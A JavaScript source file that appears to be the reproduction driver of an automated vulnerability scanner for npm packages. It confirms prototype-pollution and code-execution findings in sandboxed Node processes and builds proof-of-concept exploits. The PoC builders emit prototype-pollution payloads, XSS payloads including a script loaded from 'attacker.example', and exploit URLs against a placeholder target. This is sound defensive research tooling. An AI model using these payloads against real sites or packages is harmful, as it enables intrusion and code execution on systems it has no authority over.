import { executeInSandbox } from '../utils/sandbox.js';

/**
 * Independent reproduction driver — the zero-false-positive gate.
 *
 * A proposed finding becomes a reported vulnerability only if this driver
 * reproduces its ground-truth condition in TWO independent fresh Node processes
 * (both must agree). The reproduction worker (../utils/repro-worker.js) shares no
 * verdict logic with the discovery oracle, and each attempt runs in its own
 * process, so there is no shared mutable state and no observer effect that could
 * manufacture a false confirmation.
 *
 * Two proof kinds:
 *   reproduceProto → real prototype pollution (own-property added, named exactly
 *                    like the attacker-supplied property).
 *   reproduceRce   → real code execution (a canary token reaches globalThis).
 */

const REPRO_WORKER = 'repro-worker.js';
const DEFAULT_TIMEOUT_MS = 2000;
const REQUIRED_AGREEING_RUNS = 2;

/**
 * @param {string} packageName - installable/require-able package (or absolute path for fixtures)
 * @param {string} entryPoint  - function path, e.g. 'merge' or 'utils.extend'
 * @param {{ property: string, value: any }} descriptor
 * @param {object} [opts] - { timeoutMs, blockNetwork, version }
 * @returns {Promise<{ verified: boolean, newProps?: string[], matchedProperty?: string, callConvention?: string, runs: number, standalonePoC?: string }>}
 */
export async function reproduceProto(packageName, entryPoint, descriptor, opts = {}) {
  const timeoutMs = opts.timeoutMs || DEFAULT_TIMEOUT_MS;
  // Run both agreeing forks concurrently. They are fully independent fresh
  // processes (no shared state), so overlapping them halves per-confirmation
  // latency; the verdict is unchanged — BOTH must still verify. We forgo the
  // sequential fail-fast (a false lead now pays for two forks instead of one),
  // a good trade since confirmations are rare and the common path here is the
  // positive one, where fail-fast never fired anyway.
  const results = await Promise.all(
    Array.from({ length: REQUIRED_AGREEING_RUNS }, (_, run) =>
      executeInSandbox(packageName, entryPoint, [{}], {
        timeoutMs,
        blockNetwork: opts.blockNetwork !== false,
        browserEnv: opts.browserEnv === true,
        workerScript: REPRO_WORKER,
        mode: 'repro_pp',
        extra: { property: descriptor.property, value: descriptor.value, nonce: run },
      }).catch(err => ({ verified: false, error: err.message }))
    )
  );

  const verified = results.length === REQUIRED_AGREEING_RUNS && results.every(r => r?.verified);
  if (!verified) {
    return { verified: false, runs: results.length };
  }
  const first = results[0];
  return {
    verified: true,
    newProps: first.newProps,
    matchedProperty: first.matchedProperty,
    callConvention: first.callConvention,
    payloadKind: first.payloadKind || null,
    runs: REQUIRED_AGREEING_RUNS,
    standalonePoC: buildProtoPoC(packageName, opts.version, entryPoint, descriptor, first),
  };
}

/**
 * @param {string} packageName
 * @param {string} entryPoint
 * @param {{ property: string, gates?: string[], minimalArgs?: any[], sequence?: { steps: Array<{ call: string, method?: string, args?: any[] }> } }} spec
 *   `sequence`, when present, mirrors a config.sequences entry with each step's
 *   args already resolved to plain values (e.g. `compile()` followed by
 *   invoking its returned function — CVE-2022-29078-style gadgets only fire on
 *   the second call, never on the entry point alone).
 * @param {object} [opts]
 * @returns {Promise<{ verified: boolean, payloadType?: string, canary?: string, gates?: string[], restriction?: string, runs: number, standalonePoC?: string }>}
 *   `restriction` records what reproduction had to force to reach the sink:
 *   'none' when the sink was reached with no gate properties forced, 'gated'
 *   when one or more gates were required.
 */
export async function reproduceRce(packageName, entryPoint, spec, opts = {}) {
  const timeoutMs = opts.timeoutMs || DEFAULT_TIMEOUT_MS;
  const minimalArgs = Array.isArray(spec.minimalArgs) && spec.minimalArgs.length ? spec.minimalArgs : [{}];
  // Both agreeing forks run concurrently — see reproduceProto for the rationale.
  // Verdict is unchanged: both independent fresh processes must verify.
  const results = await Promise.all(
    Array.from({ length: REQUIRED_AGREEING_RUNS }, (_, run) =>
      executeInSandbox(packageName, entryPoint, minimalArgs, {
        timeoutMs,
        blockNetwork: opts.blockNetwork !== false,
        browserEnv: opts.browserEnv === true,
        workerScript: REPRO_WORKER,
        mode: 'repro_rce',
        extra: { property: spec.property, gates: spec.gates || [], sequence: spec.sequence || null, nonce: run },
      }).catch(err => ({ verified: false, error: err.message }))
    )
  );

  const verified = results.length === REQUIRED_AGREEING_RUNS && results.every(r => r?.verified);
  if (!verified) return { verified: false, runs: results.length };
  const first = results[0];
  const gates = first.gates || spec.gates || [];
  return {
    verified: true,
    payloadType: first.payloadType,
    canary: first.canary,
    sink: first.sink || null,
    gates,
    restriction: gates.length ? 'gated' : 'none',
    runs: REQUIRED_AGREEING_RUNS,
    standalonePoC: buildRcePoC(packageName, opts.version, entryPoint, spec, first, opts.browserEnv === true),
  };
}

// ─── Standalone PoC builders (exact minimal reproduction) ────────────────────

/**
 * Render how to invoke `entryPoint` on the `target` require()'d in the PoC.
 * Three cases:
 *   - entryPoint IS the package name (bare-function module, e.g. `module.exports
 *     = fn` for merge-deep/deep-extend) → call `target` directly, never
 *     `target.<hyphenated-name>(...)`, which would be invalid JS.
 *   - entryPoint is a dotted path of valid identifiers (e.g. 'utils.extend') →
 *     plain dot notation.
 *   - anything else (unusual/non-identifier property names) → bracket notation,
 *     which is safe for any string.
 */
function targetRef(pkg, entryPoint) {
  if (entryPoint === pkg) return 'target';
  const segments = String(entryPoint).split('.');
  const validIdent = /^[A-Za-z_$][A-Za-z0-9_$]*$/;
  if (segments.every(s => validIdent.test(s))) return `target.${entryPoint}`;
  return `target${segments.map(s => `[${JSON.stringify(s)}]`).join('')}`;
}

function buildProtoPoC(pkg, version, entryPoint, descriptor, res) {
  const spec = version ? `${pkg}@${version}` : pkg;
  const prop = descriptor.property;
  const valJson = JSON.stringify(descriptor.value);
  const propJson = JSON.stringify(prop); // safely quotes any property name
  const ref = targetRef(pkg, entryPoint);
  // Read-back uses bracket notation so names that aren't valid identifiers
  // (Symbol.toPrimitive, names with quotes/dashes) still produce valid JS.
  const readBack = `({})[${propJson}]`;

  // Render the EXACT vector that reproduced. payloadKind comes from the repro
  // worker (which of the merge/path conventions actually polluted); fall back to
  // the __proto__ JSON form when an older worker didn't report one.
  const kind = res.payloadKind || 'proto-json';
  const conv = res.callConvention || 'fn({}, payload)';
  const dispatch = conv === 'fn(true, {}, payload)'
    ? (payloadVar) => `${ref}(true, {}, ${payloadVar});`
    : conv === 'fn(payload)'
      ? (payloadVar) => `${ref}(${payloadVar});`
      : (payloadVar) => `${ref}({}, ${payloadVar});`;

  let payloadLine, call;
  if (kind === 'proto-path') {
    payloadLine = null;
    call = `${ref}({}, '__proto__.' + ${propJson}, ${valJson});`;
  } else if (kind === 'ctor-path') {
    payloadLine = null;
    call = `${ref}({}, 'constructor.prototype.' + ${propJson}, ${valJson});`;
  } else if (kind === 'ctor-object') {
    payloadLine = `const payload = { constructor: { prototype: { [${propJson}]: ${valJson} } } };`;
    call = dispatch('payload');
  } else { // proto-json
    payloadLine = `const payload = JSON.parse(${JSON.stringify(`{"__proto__":{${propJson}:${valJson}}}`)});`;
    call = dispatch('payload');
  }

  return `// PoC — prototype pollution in ${spec} via ${entryPoint}()
// Reproduced independently in ${res.runs || 2} fresh Node processes.
const target = require('${pkg}');
${payloadLine ? payloadLine + '\n' : ''}${call}
console.log(${readBack}); // => ${valJson}  (Object.prototype polluted)`;
}

// Pick an XSS payload appropriate to the DOM sink that actually fired, so the
// browser-URL PoC is accurate rather than a one-size-fits-all guess.
function xssPayloadForSink(sink) {
  if (sink === 'script.src') return '//attacker.example/xss.js';
  if (sink && (sink.endsWith('.src') || sink === 'setAttribute:src' ||
               sink === 'setAttribute:href' || sink === 'setAttribute:formaction' ||
               sink === 'setAttribute:action')) {
    return 'javascript:alert(document.domain)';
  }
  // innerHTML / outerHTML / insertAdjacentHTML / document.write / srcdoc, or an
  // unknown DOM sink: an HTML payload with a self-firing handler.
  return '<img src=x onerror=alert(document.domain)>';
}

// Client-side gadgets are exploited from the URL: a page that pollutes
// Object.prototype from query-string params (the standard client-side PP source)
// + this library's gadget = DOM XSS. Emit the exploit URL rather than a Node
// require() PoC. The tool confirmed the LIBRARY gadget (prop -> DOM sink);
// jsdom doesn't execute scripts, so this is reachability, and the full exploit
// also needs a client-side PP source on the target page.
function buildBrowserGadgetPoC(pkg, version, entryPoint, spec, res) {
  const specStr = version ? `${pkg}@${version}` : pkg;
  const prop = spec.property;
  const sink = res.sink || (res.payloadType === 'sink_reach' ? 'a DOM sink' : 'code execution');
  const isCodeExec = !res.sink && res.payloadType !== 'sink_reach';
  const payload = isCodeExec ? 'alert(document.domain)' : xssPayloadForSink(res.sink);
  const enc = encodeURIComponent(payload);
  const gateParams = (res.gates || []).map(g => `&__proto__[${encodeURIComponent(g)}]=1`).join('');
  return `// PoC — CLIENT-SIDE prototype pollution -> ${isCodeExec ? 'code execution' : 'DOM XSS'} gadget in ${specStr} via ${entryPoint}()
// Reproduced independently in ${res.runs || 2} fresh processes (polluted value reached ${sink} under jsdom).
//
// ${pkg} reads Object.prototype.${prop} and routes it to ${sink}. On a page that
// pollutes Object.prototype from the URL (the standard client-side PP source —
// a query-string parser / router), this URL triggers the gadget:
//
//   https://TARGET/?__proto__[${prop}]=${enc}${gateParams}
//   https://TARGET/?constructor[prototype][${prop}]=${enc}${gateParams}
//
// decoded payload (for ${sink}): ${payload}
//
// NOTE: the tool confirmed the LIBRARY gadget (prop -> sink); jsdom does not
// execute scripts, so this is REACHABILITY, not proven execution. The full
// exploit also requires a client-side PP source on the target page.`;
}

function buildRcePoC(pkg, version, entryPoint, spec, res, browserEnv) {
  if (browserEnv) return buildBrowserGadgetPoC(pkg, version, entryPoint, spec, res);
  const specStr = version ? `${pkg}@${version}` : pkg;
  // Bracket notation with JSON.stringify so gate/property names that aren't
  // valid identifiers still produce runnable JS.
  const gateLines = (res.gates || [])
    .map(g => `Object.prototype[${JSON.stringify(g)}] = true; // force guarded branch`)
    .join('\n');
  const ref = targetRef(pkg, entryPoint);
  // sink_reach proves the polluted value REACHED a sink argument, not that it
  // executed — say so instead of claiming "canary fired".
  const proofNote = res.payloadType === 'sink_reach'
    ? 'The polluted value reached a code/command sink argument (reachability; execution not proven, sanitization not checked).'
    : 'The polluted property reaches a code-execution sink and runs attacker code.';
  const provenance = res.payloadType === 'sink_reach'
    ? `Reproduced independently in ${res.runs || 2} fresh Node processes (polluted value reached the sink).`
    : `Reproduced independently in ${res.runs || 2} fresh Node processes (canary fired).`;
  return `// PoC — prototype pollution -> code execution in ${specStr} via ${entryPoint}()
// ${provenance}
const target = require('${pkg}');
${gateLines ? gateLines + '\n' : ''}// attacker-controlled payload on the polluted property (${res.payloadType})
Object.prototype[${JSON.stringify(spec.property)}] = "<attacker code>";
${ref}(/* attacker-influenced input */);
// ${proofNote}`;
}
